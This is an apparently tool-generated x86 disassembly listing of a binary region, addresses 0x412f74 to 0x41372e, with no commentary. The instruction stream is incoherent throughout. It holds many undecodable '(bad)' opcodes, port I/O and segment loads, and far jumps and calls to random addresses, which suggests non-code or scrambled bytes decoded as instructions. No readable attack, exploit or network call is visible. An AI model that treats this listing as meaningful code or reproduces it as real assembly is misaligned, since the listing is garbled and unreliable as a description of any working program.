  412f74:	add    DWORD PTR [edi-0x7a],ebx
  412f77:	into   
  412f78:	push   eax
  412f79:	leave  
  412f7a:	addr16 cmc 
  412f7c:	fdivr  st(5),st
  412f7e:	aaa    
  412f7f:	mov    bl,0xa3
  412f81:	mov    edi,ebx
  412f83:	sbb    al,0x1e
  412f85:	ror    DWORD PTR es:[edx],0xce
  412f89:	fndisi(8087 only) 
  412f8b:	pop    esp
  412f8c:	mov    ?,WORD PTR [esi-0x70]
  412f8f:	les    eax,FWORD PTR [edx]
  412f91:	cs push ecx
  412f93:	and    al,bl
  412f95:	cs jbe 0x412ff6
  412f98:	add    BYTE PTR [eax+0x33],0x9e
  412f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f9d:	xlat   BYTE PTR ds:[ebx]
  412f9e:	xor    bh,BYTE PTR ds:0x7a64d200
  412fa4:	test   al,0x89
  412fa6:	outs   dx,BYTE PTR ds:[esi]
  412fa7:	pop    ss
  412fa8:	jmp    0x4f4e725
  412fad:	mov    al,ds:0xbed4483d
  412fb2:	mov    esi,0x690a07cb
  412fb7:	repz cmp eax,0x2ae0ef32
  412fbd:	inc    DWORD PTR [ecx+0x3db1339]
  412fc3:	adc    dh,ch
  412fc5:	mov    edi,0xbd5e9f84
  412fca:	bound  ebx,QWORD PTR [esi]
  412fcc:	cs int 0x3f
  412fcf:	pop    edi
  412fd0:	adc    BYTE PTR [ebx],0x34
  412fd3:	cwde   
  412fd4:	mov    WORD PTR [esp+edi*2-0x78],ss
  412fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fd9:	lahf   
  412fda:	pusha  
  412fdb:	in     eax,0x37
  412fdd:	mov    ecx,DWORD PTR fs:[ebp+0x1471f717]
  412fe4:	cs out 0x7b,al
  412fe7:	mov    BYTE PTR [edx],bl
  412fe9:	scas   al,BYTE PTR es:[edi]
  412fea:	and    DWORD PTR [esi],edx
  412fec:	add    DWORD PTR [ebx],esp
  412fee:	dec    ebp
  412fef:	push   0xffffff8e
  412ff1:	jbe    0x41304e
  412ff3:	sub    ah,cl
  412ff5:	mov    esp,edx
  412ff7:	clc    
  412ff8:	(bad)  
  412ff9:	pop    ss
  412ffa:	push   edx
  412ffb:	inc    edi
  412ffc:	jmp    0x41300f
  412ffe:	push   ebx
  412fff:	mov    edx,0x4a86addf
  413004:	jl     0x412fb9
  413006:	dec    esp
  413007:	in     eax,0x91
  413009:	leave  
  41300a:	push   ebx
  41300b:	mov    ebp,0x3deca55c
  413010:	(bad)  
  413011:	test   eax,0x30296064
  413016:	pop    ebx
  413017:	into   
  413018:	imul   DWORD PTR [eax+0x320ad664]
  41301e:	loope  0x41301f
  413020:	and    edx,DWORD PTR [edx]
  413022:	or     DWORD PTR [esi],ebp
  413024:	and    ebx,ebx
  413026:	call   0xa5fc7167
  41302b:	test   ch,cl
  41302d:	in     eax,0xbf
  41302f:	xchg   BYTE PTR [esi-0x6c0e396b],dh
  413035:	sub    edx,0xba2eb8
  41303b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41303c:	or     ch,BYTE PTR [edx-0x26689029]
  413042:	xor    al,0xc0
  413044:	cmp    DWORD PTR [ebp+edx*1+0x78],esp
  413048:	inc    ecx
  413049:	add    edx,DWORD PTR [ebx-0x61]
  41304c:	add    esi,DWORD PTR [ebx-0x5e]
  41304f:	std    
  413050:	pop    ebp
  413051:	retf   
  413052:	dec    esi
  413053:	das    
  413054:	jb     0x4130a8
  413056:	addr16 and ah,ah
  413059:	add    eax,0x3521a9ca
  41305e:	lock mov al,ds:0xb4534487
  413064:	js     0x41301c
  413066:	pop    edi
  413067:	mov    eax,0x49779a08
  41306c:	ins    BYTE PTR es:[edi],dx
  41306d:	and    bl,BYTE PTR [ebx+0x58]
  413070:	mov    dl,0xd8
  413072:	out    0x3b,eax
  413074:	adc    al,0xd0
  413076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413077:	adc    ebp,DWORD PTR [ebp-0x70]
  41307a:	dec    ebx
  41307b:	fsub   st,st(1)
  41307d:	outs   dx,BYTE PTR ds:[esi]
  41307e:	add    ecx,esi
  413080:	stos   DWORD PTR es:[edi],eax
  413081:	mov    bh,BYTE PTR [esi+0x7c]
  413084:	shl    DWORD PTR [edx],cl
  413086:	or     esi,DWORD PTR [ecx-0x7614c978]
  41308c:	cmp    al,0x65
  41308e:	mov    ds:0xea09d350,al
  413093:	repnz xor eax,0x4667bb78
  413099:	enter  0x665c,0xf4
  41309d:	sub    DWORD PTR [esi],esp
  41309f:	add    cl,BYTE PTR [eax-0x2a]
  4130a2:	mov    ds:0x247b2a11,al
  4130a7:	push   ebp
  4130a8:	jns    0x4130b2
  4130aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ab:	inc    eax
  4130ac:	mov    dl,0x74
  4130ae:	in     al,dx
  4130af:	fadd   QWORD PTR [esi]
  4130b1:	or     al,0x65
  4130b3:	or     eax,0x75a63a7c
  4130b8:	int    0x62
  4130ba:	nop
  4130bb:	arpl   WORD PTR [esi+0x9],si
  4130be:	(bad)  
  4130bf:	adc    BYTE PTR [ecx-0x2d],bh
  4130c2:	scas   eax,DWORD PTR es:[edi]
  4130c3:	int3   
  4130c4:	loope  0x4130c4
  4130c6:	cmp    al,0x9c
  4130c8:	call   0x6357bb01
  4130cd:	add    BYTE PTR ds:0xb34e2e67,ah
  4130d3:	sbb    edi,esp
  4130d5:	xchg   DWORD PTR [ecx],esi
  4130d7:	xchg   edx,eax
  4130d8:	jb     0x4130a4
  4130da:	daa    
  4130db:	dec    ebp
  4130dc:	js     0x413128
  4130de:	dec    eax
  4130e0:	mov    dh,0x7a
  4130e2:	js     0x413072
  4130e4:	mov    ss,WORD PTR [edi-0xd9901b4]
  4130ea:	ffree  st(7)
  4130ec:	nop
  4130ed:	xchg   ebp,eax
  4130ee:	jne    0x413113
  4130f0:	fidivr DWORD PTR [esi]
  4130f2:	aam    0x6a
  4130f4:	ret    
  4130f5:	test   eax,0xb900b24c
  4130fa:	mov    edx,0x48737dc6
  4130ff:	jle    0x413149
  413101:	push   0xc4a3fbc9
  413106:	cld    
  413107:	leave  
  413108:	jns    0x4130e9
  41310a:	xor    cl,BYTE PTR [esi+0x19]
  41310d:	lods   eax,DWORD PTR ds:[esi]
  41310e:	leave  
  41310f:	aad    0x9d
  413111:	push   ss
  413112:	add    DWORD PTR ds:0x1343809,edi
  413118:	push   eax
  413119:	fcom   QWORD PTR [edi]
  41311b:	or     eax,0x84bb3246
  413120:	or     bh,BYTE PTR [edi]
  413122:	rol    BYTE PTR [edi-0x1439eaa7],0x9a
  413129:	enter  0x944d,0x9
  41312d:	xor    eax,0x12f2018
  413132:	mov    BYTE PTR [esi+0x32],dl
  413135:	inc    ecx
  413136:	je     0x4130f0
  413138:	int3   
  413139:	inc    ebp
  41313a:	pop    eax
  41313b:	push   ecx
  41313c:	mov    bh,0xb4
  41313e:	dec    ebx
  41313f:	out    0xab,al
  413141:	add    BYTE PTR [ecx-0x2f33839],dh
  413147:	mov    ah,0x79
  413149:	dec    edx
  41314a:	rcl    bl,cl
  41314c:	neg    BYTE PTR [edx]
  41314e:	push   0xd51d985b
  413153:	xchg   esi,eax
  413154:	test   BYTE PTR [esi],dl
  413156:	cwde   
  413157:	test   BYTE PTR [ebx],0x84
  41315a:	sbb    bl,BYTE PTR [esi+0x48716602]
  413160:	sbb    BYTE PTR [esi+0x5],ah
  413163:	xchg   ebx,eax
  413164:	ror    BYTE PTR [edi-0x63],cl
  413167:	dec    edi
  413168:	mov    BYTE PTR [esi+0x6d241617],ch
  41316e:	add    DWORD PTR [ecx],ebx
  413170:	or     DWORD PTR [edi-0x4b],ecx
  413173:	mov    eax,ds:0x2e3b76d9
  413178:	outs   dx,BYTE PTR ds:[esi]
  413179:	dec    ebx
  41317a:	mov    ds:0xfc90db6d,al
  41317f:	pop    ecx
  413180:	addr16 retf 0x73c9
  413184:	jg     0x413187
  413186:	fsub   QWORD PTR [edi-0x77029167]
  41318c:	jo     0x4131ea
  41318e:	inc    ebp
  41318f:	push   edx
  413190:	mov    eax,ds:0x8850c0a5
  413195:	mov    BYTE PTR [esi+edi*8-0x77],cl
  413199:	push   ebp
  41319a:	pop    ss
  41319b:	jo     0x413171
  41319d:	dec    ebp
  41319e:	mov    cl,0x5d
  4131a0:	mov    ebx,0x74f45be9
  4131a5:	fadd   QWORD PTR [ebp-0x4d33b682]
  4131ab:	fiadd  WORD PTR [edx]
  4131ad:	and    cl,BYTE PTR [ebx+ebx*1]
  4131b0:	test   BYTE PTR [edx+0x6e],ch
  4131b3:	jo     0x41314a
  4131b5:	aam    0x4
  4131b7:	pushf  
  4131b8:	mov    esp,0x5e3ed82a
  4131bd:	dec    ebx
  4131be:	(bad)
  4131c1:	xlat   BYTE PTR ds:[ebx]
  4131c2:	xlat   BYTE PTR ds:[ebx]
  4131c3:	rol    DWORD PTR [esi+0x2dec8ea5],0x95
  4131ca:	xchg   ecx,eax
  4131cb:	dec    ebx
  4131cc:	pop    edx
  4131cd:	inc    ecx
  4131ce:	cmc    
  4131cf:	jno    0x4131fe
  4131d1:	ss and esi,0x422e7b27
  4131d8:	jbe    0x41323a
  4131da:	inc    edi
  4131db:	test   eax,0x57d14770
  4131e0:	es int3 
  4131e2:	cmp    DWORD PTR [eax+0x28a5f5ce],eax
  4131e8:	and    ecx,esi
  4131ea:	xchg   ecx,eax
  4131eb:	add    eax,0x3f040ae5
  4131f0:	(bad)  
  4131f1:	cli    
  4131f2:	rol    DWORD PTR [esi-0xe],cl
  4131f5:	xor    al,0xee
  4131f7:	push   eax
  4131f8:	fsqrt  
  4131fa:	rol    BYTE PTR [eax],1
  4131fc:	sub    ebp,DWORD PTR [ebx+0x70]
  4131ff:	(bad)  
  413200:	xchg   edi,eax
  413201:	dec    ebx
  413202:	jnp    0x413188
  413204:	fs xchg ebp,eax
  413206:	hlt    
  413207:	add    eax,0x889535e5
  41320c:	sti    
  41320d:	mov    BYTE PTR [ebx+ebx*1+0x6f],cl
  413211:	in     al,dx
  413212:	aas    
  413213:	cmp    eax,0x8f900a09
  413218:	sbb    ah,cl
  41321a:	mov    edx,0xfbba3770
  41321f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413220:	sub    al,BYTE PTR [edx+ecx*1]
  413223:	call   0x713d:0x7b8a5896
  41322a:	pushf  
  41322b:	loop   0x4131e2
  41322d:	xor    dl,BYTE PTR [ebx+0x33f6adbd]
  413233:	out    0x9,eax
  413235:	inc    ebx
  413236:	mov    ecx,ss
  413238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413239:	and    bh,cl
  41323b:	bound  ebp,QWORD PTR [edi+0x510b277f]
  413241:	adc    BYTE PTR [ecx+0x20],0x2
  413245:	in     eax,0x77
  413247:	sbb    eax,0x42abee26
  41324c:	add    al,0x88
  41324e:	adc    BYTE PTR [eax],cl
  413250:	in     eax,0x1a
  413252:	sub    eax,0xf1d8c03f
  413257:	inc    esi
  413258:	push   ss
  413259:	cdq    
  41325a:	dec    ebp
  41325b:	out    dx,al
  41325c:	jbe    0x41321c
  41325e:	xor    eax,0x2346ceb2
  413263:	out    0x12,eax
  413265:	sbb    ebx,DWORD PTR [ebx+0x6db210be]
  41326b:	ja     0x41327a
  41326d:	fistp  QWORD PTR [ecx-0x5e29b065]
  413273:	cmp    DWORD PTR [edx+0x48],eax
  413276:	pop    ss
  413277:	jl     0x4132d6
  413279:	arpl   WORD PTR ds:0xa24ae697,bp
  41327f:	fwait
  413280:	dec    ecx
  413281:	adc    al,0x86
  413283:	pop    ecx
  413284:	pusha  
  413285:	fcomp  QWORD PTR ds:0x3d62d5c6
  41328b:	jbe    0x4132b4
  41328d:	mov    ds:0xfe21d79d,al
  413292:	mov    dl,0xfa
  413294:	sbb    BYTE PTR [ecx+edi*1],dh
  413297:	cmp    dl,BYTE PTR [ecx-0x3e]
  41329a:	cli    
  41329b:	xchg   ebx,eax
  41329c:	and    al,0x30
  41329e:	push   cs
  41329f:	icebp  
  4132a0:	pop    eax
  4132a1:	pusha  
  4132a2:	ja     0x4132da
  4132a4:	lds    edi,FWORD PTR [esp+ecx*2]
  4132a7:	es stos BYTE PTR es:[edi],al
  4132a9:	jp     0x41326f
  4132ab:	test   al,0xa3
  4132ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132ae:	in     eax,dx
  4132af:	(bad)  
  4132b0:	(bad)  
  4132b2:	push   0x474a83ef
  4132b7:	mov    esi,0x414b120e
  4132bc:	mov    bh,0xe4
  4132be:	adc    ah,ch
  4132c0:	(bad)  
  4132c2:	ds popf 
  4132c4:	scas   eax,DWORD PTR es:[edi]
  4132c5:	in     al,dx
  4132c6:	lods   al,BYTE PTR ds:[esi]
  4132c7:	push   0xbcdeb1c3
  4132cc:	and    eax,0x3047d9f0
  4132d1:	add    BYTE PTR [ebx-0x17b60ba9],ah
  4132d7:	xchg   edx,eax
  4132d8:	mov    ecx,0xb5f5783d
  4132dd:	jne    0x413320
  4132df:	adc    BYTE PTR [edi-0x17b203d4],0x92
  4132e6:	xchg   ecx,eax
  4132e7:	fstp   TBYTE PTR [ebp-0x7d7b1584]
  4132ed:	inc    ebx
  4132ee:	(bad)  
  4132ef:	pop    ds
  4132f0:	test   BYTE PTR [edi-0x7],0x85
  4132f4:	xchg   edx,eax
  4132f5:	add    al,0x63
  4132f8:	xchg   ecx,eax
  4132f9:	dec    ecx
  4132fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132fb:	jmp    0x7ce9b763
  413300:	and    dh,BYTE PTR [edi]
  413302:	imul   esp,ecx,0x4f57192e
  413308:	(bad)  
  413309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41330a:	sbb    eax,0xcea637f2
  41330f:	inc    esp
  413310:	add    esp,eax
  413312:	sar    DWORD PTR [esi],1
  413314:	mov    ebx,0xa6cce072
  413319:	loop   0x41333f
  41331b:	inc    eax
  41331c:	xchg   ebx,eax
  41331d:	ja     0x41335d
  41331f:	lods   eax,DWORD PTR ds:[esi]
  413320:	xchg   edi,eax
  413321:	sbb    dl,al
  413323:	pop    esp
  413324:	rcr    DWORD PTR [ebx+0x4c30f670],0x7d
  41332b:	jp     0x413303
  41332d:	xor    edi,esi
  41332f:	ss aas 
  413331:	pop    ebp
  413332:	mov    eax,ds:0x51e82865
  413337:	push   eax
  413338:	inc    ecx
  413339:	lahf   
  41333a:	mov    ebp,DWORD PTR [esi-0x1f]
  41333d:	sub    cl,BYTE PTR [ecx+0x5cd29f23]
  413343:	or     ebx,ebx
  413345:	or     DWORD PTR [edi],edi
  413347:	sub    BYTE PTR [ebp-0x4aa24fd3],dl
  41334d:	pusha  
  41334e:	imul   ebx,esi,0xffffff8b
  413351:	mov    dh,0xa3
  413353:	or     DWORD PTR [ebp-0x30],esi
  413356:	in     eax,dx
  413357:	adc    edi,DWORD PTR [esi+0x69]
  41335a:	(bad)  
  41335b:	in     al,0xfe
  41335d:	jecxz  0x41331b
  41335f:	pusha  
  413360:	(bad)  
  413361:	push   ebp
  413362:	mov    esi,DWORD PTR [edi+ecx*8-0x10]
  413366:	jae    0x413351
  413368:	pop    es
  413369:	int3   
  41336a:	outs   dx,BYTE PTR ds:[esi]
  41336b:	lea    eax,[edx+0x77]
  41336e:	jecxz  0x41339b
  413370:	data16 mov ch,0x9b
  413373:	test   al,0x94
  413375:	adc    bl,BYTE PTR [ebx-0x65cc3b9f]
  41337b:	xor    DWORD PTR [eax],edx
  41337d:	ins    DWORD PTR es:[edi],dx
  41337e:	pop    ds
  41337f:	jae    0x413352
  413381:	int    0xa7
  413383:	inc    ebp
  413384:	clc    
  413385:	js     0x413394
  413387:	push   eax
  413388:	jp     0x4133f6
  41338a:	or     al,al
  41338c:	push   eax
  41338d:	adc    DWORD PTR [ebx+0xd8f666f],esp
  413393:	loop   0x413363
  413395:	cs xlat BYTE PTR ss:[ebx]
  413398:	push   esi
  413399:	rcl    eax,1
  41339b:	xchg   esp,eax
  41339c:	inc    esp
  41339d:	push   edx
  41339e:	scas   eax,DWORD PTR es:[edi]
  41339f:	loop   0x4133a0
  4133a1:	mov    bh,0x56
  4133a3:	lahf   
  4133a4:	pop    ds
  4133a5:	test   eax,0x3ddd4861
  4133aa:	push   ss
  4133ab:	inc    dx
  4133ad:	clc    
  4133ae:	inc    edx
  4133af:	mov    ecx,0x53006e1f
  4133b4:	mov    edx,0x3195c4ba
  4133b9:	js     0x41334d
  4133bb:	loope  0x4133de
  4133bd:	mov    bl,0xc5
  4133bf:	imul   ebp,DWORD PTR [edx-0x52],0xffffffb1
  4133c3:	aam    0x88
  4133c5:	xor    DWORD PTR [edx],esp
  4133c7:	rcr    BYTE PTR [eax-0x4c073439],cl
  4133cd:	sub    al,BYTE PTR [ebp+0x5bfe9e0e]
  4133d3:	ret    0xf118
  4133d6:	out    dx,eax
  4133d7:	push   ecx
  4133d8:	das    
  4133d9:	lahf   
  4133da:	xchg   ecx,eax
  4133db:	leave  
  4133dc:	scas   eax,DWORD PTR es:[edi]
  4133dd:	ja     0x413368
  4133df:	inc    edx
  4133e0:	ficom  WORD PTR [esi]
  4133e2:	pushf  
  4133e3:	jle    0x4133a6
  4133e5:	retf   0xa76f
  4133e8:	adc    BYTE PTR [edx+0x16],cl
  4133eb:	jge    0x4133c0
  4133ed:	les    edx,FWORD PTR [ebx+0xb07deb2]
  4133f3:	call   0xf6e285ce
  4133f8:	xchg   ebx,eax
  4133f9:	mov    ds:0xaab206b4,eax
  4133fe:	sbb    bl,BYTE PTR [ecx]
  413400:	mov    edi,es
  413402:	mov    DWORD PTR [edx+0x9],esi
  413405:	shr    esi,0x1d
  413408:	or     DWORD PTR [eax+0x3b],0x5354b835
  41340f:	push   ds
  413410:	mov    BYTE PTR [esi],ah
  413412:	or     eax,0x4298552c
  413417:	mov    eax,ds:0x4d35b2
  41341c:	sbb    BYTE PTR [ecx+0x3a],dl
  41341f:	inc    esp
  413420:	mov    al,0x58
  413422:	push   0xffffffed
  413424:	mov    ss,WORD PTR [esi-0x3cc343ab]
  41342a:	mov    dh,0x32
  41342c:	mov    ch,0x2c
  41342e:	adc    BYTE PTR [ebx+ebp*8],ch
  413431:	pop    esp
  413432:	call   0x7edd:0xe6a14b6b
  413439:	in     eax,dx
  41343a:	repz mov cl,0x3f
  41343d:	hlt    
  41343e:	cmp    eax,0xab354cfa
  413443:	jp     0x4133f8
  413445:	sub    eax,0xd4cbcaa9
  41344a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41344b:	pop    gs
  41344d:	jae    0x4133e5
  41344f:	inc    ecx
  413450:	out    dx,al
  413451:	dec    ecx
  413452:	int    0xb4
  413454:	sahf   
  413455:	sub    al,0xce
  413457:	data16 sub BYTE PTR [esi+0x79501e11],bl
  41345e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41345f:	xor    ah,BYTE PTR [ecx+0x5a]
  413462:	mov    edx,DWORD PTR [di+0x4dde]
  413467:	lods   eax,DWORD PTR ds:[esi]
  413468:	rcl    DWORD PTR [eax-0x49],0xff
  41346c:	xchg   BYTE PTR [edx+edi*2+0x74],dh
  413470:	sub    edi,DWORD PTR [edx-0x70]
  413473:	pop    ds
  413474:	inc    edi
  413475:	lea    ecx,[eax-0x775dd6e1]
  41347b:	fld    TBYTE PTR [ecx-0xb]
  41347e:	in     eax,0x30
  413480:	in     al,dx
  413481:	pop    ss
  413482:	cwde   
  413483:	stos   BYTE PTR es:[edi],al
  413484:	mov    bl,dh
  413486:	(bad)
  413489:	cld    
  41348a:	dec    ebx
  41348b:	aas    
  41348c:	jns    0x413483
  41348e:	cmp    al,0xcc
  413490:	mov    BYTE PTR [esi-0xb],ah
  413493:	jmp    0x4134d5
  413495:	xchg   BYTE PTR [eax-0x77],cl
  413498:	(bad)  
  413499:	pop    ss
  41349a:	inc    edi
  41349b:	retf   0x826
  41349e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41349f:	sub    al,cl
  4134a1:	test   BYTE PTR [edx+edi*2-0x3832c1dc],ch
  4134a8:	stos   BYTE PTR es:[edi],al
  4134a9:	xchg   ecx,eax
  4134aa:	mov    edx,0x924c2360
  4134af:	popa   
  4134b0:	inc    esp
  4134b1:	daa    
  4134b2:	daa    
  4134b3:	inc    ebp
  4134b4:	arpl   WORD PTR [edi],bx
  4134b6:	rol    ah,0xd4
  4134b9:	in     eax,0x3f
  4134bb:	adc    edx,DWORD PTR [ebx+0x75]
  4134be:	sub    DWORD PTR [eax],ebx
  4134c0:	aaa    
  4134c1:	dec    ebx
  4134c2:	xchg   esp,eax
  4134c3:	hlt    
  4134c4:	inc    esi
  4134c5:	jne    0x413473
  4134c7:	pop    esi
  4134c8:	out    0x5e,al
  4134ca:	mov    ch,0x84
  4134cc:	es mov ebp,0x28179793
  4134d2:	sub    al,0x98
  4134d4:	adc    eax,0x3bfb9f5
  4134d9:	push   eax
  4134da:	fcmovnbe st,st(5)
  4134dd:	dec    ebp
  4134de:	push   eax
  4134df:	dec    edi
  4134e0:	rcr    DWORD PTR [edi-0x2c],0x45
  4134e4:	xchg   ecx,eax
  4134e5:	out    0xf,eax
  4134e7:	push   ebp
  4134e8:	add    ecx,DWORD PTR [ebx-0x2d3de748]
  4134ee:	loope  0x4134af
  4134f0:	fisubr WORD PTR ds:0xd459909b
  4134f6:	add    ebx,DWORD PTR [ebx+0x75]
  4134f9:	pop    ecx
  4134fa:	popf   
  4134fb:	sub    eax,0x52e7248
  413500:	and    DWORD PTR [esi+0x44],0x34
  413504:	inc    esi
  413505:	call   0x6904e69d
  41350a:	aad    0x4a
  41350c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41350d:	pop    edi
  41350e:	fmul   QWORD PTR [ecx-0x5b629555]
  413514:	xchg   edi,eax
  413515:	popf   
  413516:	jmp    0xca81:0x5707e1ee
  41351d:	int3   
  41351e:	dec    ebx
  41351f:	(bad)  
  413520:	push   cs
  413521:	cmc    
  413522:	fs xor eax,0xb1c1de15
  413528:	and    BYTE PTR [esi],bl
  41352a:	xchg   edx,eax
  41352b:	cmp    BYTE PTR [ebp-0x75],0x10
  41352f:	cmp    DWORD PTR [edi-0x5ca4311b],ebx
  413535:	mov    cl,bh
  413537:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413538:	icebp  
  413539:	push   ebx
  41353a:	leave  
  41353b:	mov    edi,0xc29d82bf
  413540:	push   0xffffffde
  413542:	push   ebx
  413543:	in     eax,0x69
  413545:	les    ecx,FWORD PTR [esi]
  413547:	mov    edi,ebx
  413549:	rol    DWORD PTR [esi],1
  41354b:	push   esp
  41354c:	or     BYTE PTR [esi],0x18
  41354f:	sub    DWORD PTR [ecx],0x77fe4a3f
  413555:	sub    al,0xb7
  413557:	ja     0x41355a
  413559:	add    DWORD PTR [ecx],ebx
  41355b:	and    BYTE PTR [eax+0x7],dh
  41355e:	dec    ebx
  41355f:	inc    eax
  413560:	hlt    
  413561:	jecxz  0x41355d
  413563:	jmp    0x41354c
  413565:	sub    esp,ebx
  413567:	jns    0x413563
  413569:	sub    bl,bl
  41356b:	push   ebp
  41356c:	and    BYTE PTR [ebp-0xc],0x3a
  413570:	or     BYTE PTR [edx+0x48],cl
  413573:	lods   al,BYTE PTR ds:[esi]
  413574:	jle    0x41355b
  413576:	and    cl,BYTE PTR [ecx-0x11]
  413579:	das    
  41357a:	sub    al,0x4c
  41357c:	add    esi,esi
  41357e:	mov    bl,0x59
  413580:	sbb    BYTE PTR [edi+0x51],0xe
  413584:	pop    ecx
  413585:	cmc    
  413586:	mov    al,0xc9
  413588:	pushf  
  413589:	add    eax,DWORD PTR [edi]
  41358b:	pop    edi
  41358c:	cmp    DWORD PTR [edi-0x37],0x81df6afd
  413593:	pop    ebp
  413594:	mov    edx,0x3201426e
  413599:	inc    edi
  41359a:	mov    bl,0x84
  41359c:	fistp  DWORD PTR [ecx-0x3efb84c2]
  4135a2:	push   edi
  4135a3:	push   ebp
  4135a4:	cmp    edi,DWORD PTR [edx-0x389f230]
  4135aa:	ds mov edi,0x6ae9de65
  4135b0:	inc    eax
  4135b1:	inc    ebx
  4135b2:	(bad)  
  4135b4:	adc    eax,0xdf6de2c5
  4135b9:	mov    al,ds:0x1cc31ecf
  4135be:	cmp    edx,DWORD PTR [ebx-0x20]
  4135c1:	mov    ebx,0x205cbff7
  4135c6:	arpl   WORD PTR [esi-0x16],bx
  4135c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ca:	inc    edi
  4135cb:	sbb    eax,0x234c3890
  4135d0:	enter  0x471f,0xc4
  4135d4:	push   es
  4135d5:	sub    esp,DWORD PTR [ebp+0x4]
  4135d8:	lock add eax,0xe02f3ae8
  4135de:	and    bh,ch
  4135e0:	repz sbb DWORD PTR [ecx+0x78af8364],ebx
  4135e7:	out    dx,al
  4135e8:	jl     0x413662
  4135ea:	int    0x3f
  4135ec:	iret   
  4135ed:	inc    ecx
  4135ee:	pusha  
  4135ef:	f2xm1  
  4135f1:	lods   eax,DWORD PTR ds:[esi]
  4135f2:	popf   
  4135f3:	(bad)  
  4135f4:	rcr    DWORD PTR ds:0xc6c034f9,0x90
  4135fb:	psllq  mm3,QWORD PTR [eax+0x24c5079e]
  413602:	int3   
  413603:	xlat   BYTE PTR ds:[ebx]
  413604:	jmp    0x5a9:0x303bfca3
  41360b:	aas    
  41360c:	and    ch,BYTE PTR [edx-0x18]
  41360f:	sbb    BYTE PTR [edx+0x7fe5b36b],dl
  413615:	arpl   WORD PTR [edi-0x6c],di
  413618:	push   esp
  413619:	xchg   ecx,eax
  41361a:	pop    ecx
  41361b:	inc    ebx
  41361c:	push   ss
  41361d:	es jmp 0x413623
  413620:	add    DWORD PTR [ecx],0xfd352f3d
  413626:	daa    
  413627:	rcr    DWORD PTR [eax-0x45c68fe1],1
  41362d:	cmp    DWORD PTR [ebx],esp
  41362f:	mov    esp,0x21628c06
  413634:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413635:	jne    0x41366c
  413637:	add    DWORD PTR [ecx-0x1513256],esi
  41363d:	out    dx,al
  41363e:	xchg   eax,ecx
  413640:	stc    
  413641:	push   edx
  413642:	ret    0x67f6
  413645:	fcom   DWORD PTR [edi]
  413647:	sahf   
  413648:	mov    edi,0x28f2b726
  41364d:	repnz add dh,BYTE PTR [ebx+0x3a]
  413651:	mov    bh,0x40
  413653:	adc    al,BYTE PTR [ecx+ebp*8-0x71b6a102]
  41365a:	cli    
  41365b:	pushf  
  41365c:	add    ah,BYTE PTR [ecx+0x24]
  41365f:	enter  0x808f,0xb
  413663:	call   0xf627:0x6a26712
  41366a:	inc    ebp
  41366b:	push   ecx
  41366c:	dec    edi
  41366d:	mov    dh,BYTE PTR [edx-0x6d]
  413670:	test   edi,0x40810e97
  413676:	or     esi,DWORD PTR es:[esi]
  413679:	retf   0x66e3
  41367c:	cdq    
  41367d:	inc    ebp
  41367e:	cdq    
  41367f:	inc    esp
  413680:	shr    BYTE PTR [edx+0x4410695f],0x3
  413687:	xchg   ebx,eax
  413688:	popa   
  413689:	jmp    0x895ba422
  41368e:	jmp    0x8f5560b7
  413693:	fist   DWORD PTR ds:0x60322ef7
  413699:	aaa    
  41369a:	clc    
  41369b:	adc    eax,0x54a6b0b4
  4136a0:	add    ecx,eax
  4136a2:	inc    eax
  4136a3:	xchg   ebx,eax
  4136a4:	xchg   ecx,eax
  4136a5:	repz or eax,DWORD PTR [eax]
  4136a8:	(bad)  
  4136a9:	out    dx,eax
  4136aa:	ja     0x413722
  4136ac:	mov    BYTE PTR [edx-0x1e],al
  4136af:	push   eax
  4136b0:	mov    edi,0x1a2ded71
  4136b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136b6:	int3   
  4136b7:	(bad)  [ebp+0x63]
  4136ba:	sub    DWORD PTR [ebp+0x3],edx
  4136bd:	push   es
  4136be:	ret    
  4136bf:	call   0x53a21d37
  4136c4:	adc    DWORD PTR [ecx+0x60b9bef4],ebx
  4136ca:	icebp  
  4136cb:	inc    esp
  4136cc:	rcl    DWORD PTR [esi],0x88
  4136cf:	fisttp WORD PTR [ecx]
  4136d1:	xor    eax,0xfee10c4a
  4136d6:	adc    DWORD PTR [edi+0x64748462],ecx
  4136dc:	cmp    al,bl
  4136de:	sub    dl,BYTE PTR [eax+0x22938cf]
  4136e4:	push   ss
  4136e5:	push   cs
  4136e6:	rcl    DWORD PTR [eax],0x51
  4136e9:	idiv   DWORD PTR [edx+0x1bb04a17]
  4136ef:	sbb    edi,eax
  4136f1:	retf   0xb4dc
  4136f4:	test   al,0xdf
  4136f6:	and    al,0x2c
  4136f8:	sub    dh,BYTE PTR [eax+ecx*4]
  4136fb:	fnstsw WORD PTR [ebx+0x44]
  4136fe:	push   cs
  4136ff:	push   ss
  413700:	pusha  
  413701:	fimul  WORD PTR ds:0x23ef4817
  413707:	das    
  413708:	push   esi
  413709:	daa    
  41370a:	fcmovne st,st(7)
  41370c:	adc    al,0x46
  41370e:	cld    
  41370f:	outs   dx,BYTE PTR ds:[esi]
  413710:	adc    al,0xd3
  413712:	inc    ebx
  413713:	imul   esp,DWORD PTR [eax],0x13
  413716:	mov    ebp,0x87ac0380
  41371b:	push   ss
  41371c:	jae    0x4136e8
  41371e:	inc    esp
  41371f:	jg     0x41377e
  413721:	mov    edi,0x140f3546
  413726:	inc    esp
  413727:	and    ebx,ebx
  413729:	ss aam 0xdd
  41372c:	mov    gs,esp
  41372e:	mov    eax,ds:0x9a3cf8f0
